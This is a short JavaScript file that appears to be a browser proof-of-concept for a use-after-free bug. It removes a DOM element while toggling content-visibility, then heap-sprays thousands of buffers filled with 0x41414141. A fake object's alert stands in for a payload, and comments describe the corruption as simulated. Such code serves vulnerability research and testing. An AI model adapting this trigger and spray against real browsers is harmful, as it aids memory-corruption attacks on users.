import { debug_log } from './module/utils.mjs';

const container = document.querySelector(".container");
let child = document.querySelector(".child");

function heapSpray() {
  const spray = [];
  const pattern = 0x41414141; // patrón "AAAA"

  // Objeto simula memoria corrupta con método que muestra alerta
  const fakeObj = {
    showMessage() {
      alert("⚠️ Mensaje simulado desde memoria corrupta (fake object).");
      debug_log("Alert from fakeObj.showMessage() called.");
    }
  };

  for (let i = 0; i < 3000; i++) {
    let buffer = new ArrayBuffer(0x1000);
    let view = new Uint32Array(buffer);
    view.fill(pattern);
    spray.push(view);
  }

  spray.push(fakeObj);

  debug_log("Heap spray with pattern and fakeObj with alert method completed.");
  return spray;
}

export function triggerUAF() {
  if (!container || !child) {
    debug_log("Missing container or child element.");
    return;
  }

  try {
    container.style.contentVisibility = "hidden";
    child.remove();

    setTimeout(() => {
      container.style.contentVisibility = "auto";
      const spray = heapSpray();

      if (!document.querySelector(".child")) {
        debug_log("✅ .child element removed from DOM (memory possibly freed).");
      } else {
        debug_log("❌ .child element still in DOM.");
      }

      // Llamar al método showMessage del fakeObj para simular mensaje emergente
      try {
        spray[spray.length - 1].showMessage();
      } catch (e) {
        debug_log("Error calling showMessage(): " + e.message);
      }

      if (spray.length > 0 && spray[0][0] === pattern) {
        debug_log("Heap spray pattern detected in first buffer.");
      } else {
        debug_log("Heap spray pattern NOT detected in first buffer.");
      }

      debug_log("UAF triggered. Check for crash or memory corruption.");

    }, 0);

  } catch (e) {
    debug_log("Exception caught during triggerUAF: " + e.message);
  }
}
